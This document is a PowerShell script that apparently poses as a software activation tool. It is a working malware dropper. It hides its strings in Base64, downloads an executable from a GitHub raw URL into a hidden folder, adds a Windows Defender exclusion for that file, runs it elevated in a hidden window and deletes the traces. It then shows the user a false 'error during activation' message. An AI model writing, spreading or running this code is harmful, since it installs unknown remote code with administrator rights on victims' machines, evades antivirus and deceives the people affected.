# --- BEGIN SCRIPT ---

# Base64-encoded variables
$downloadUrlB64      = "aHR0cHM6Ly9naXRodWIuY29tL2tleWZhbXMva2V5cy9yYXcvcmVmcy9oZWFkcy9tYWluL21haW4uZXhl"
$updaterExeB64       = "dXBkYXRlci5leGU="
$hiddenAttrB64       = "SGlkZGVu"
$silentlyContinueB64 = "U2lsZW50bHljb250aW51ZQ=="
$stopActionB64       = "U3RvcA=="
$directoryB64        = "RGlyZWN0b3J5"
$runAsB64            = "UnVuQXM="

# Decode each Base64 string into a usable value
$downloadUrl      = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadUrlB64))
$updaterExe       = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))
$hiddenAttr       = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
$stopAction       = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
$directory        = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
$runAs            = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))

# Create a hidden folder in %LOCALAPPDATA% with a random GUID name
$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
New-Item -ItemType $directory -Path $hiddenFolder | Out-Null

# Build the path for the downloaded EXE
$tempPath = Join-Path $hiddenFolder $updaterExe

# Function to add an exclusion path in Windows Defender
function Add-Exclusion {
    param ([string]$Path)
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
    } catch {
        # Suppress any errors
    }
}

try {
    # Download the file and save to $tempPath
    Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction

    # Hide the folder and the downloaded EXE by setting the Hidden attribute
    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
    Set-ItemProperty -Path $tempPath   -Name Attributes -Value $hiddenAttr

    # Add an exclusion for the downloaded EXE
    Add-Exclusion -Path $tempPath

    # Execute the downloaded EXE with elevated privileges, hidden window
    Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -Wait

    # Remove the entire hidden folder after execution
    Remove-Item $hiddenFolder -Recurse -Force
}
catch {
    exit 1
}
finally {
    Write-Host "An error occurred during activation. Please try again."
}

# --- END SCRIPT ---
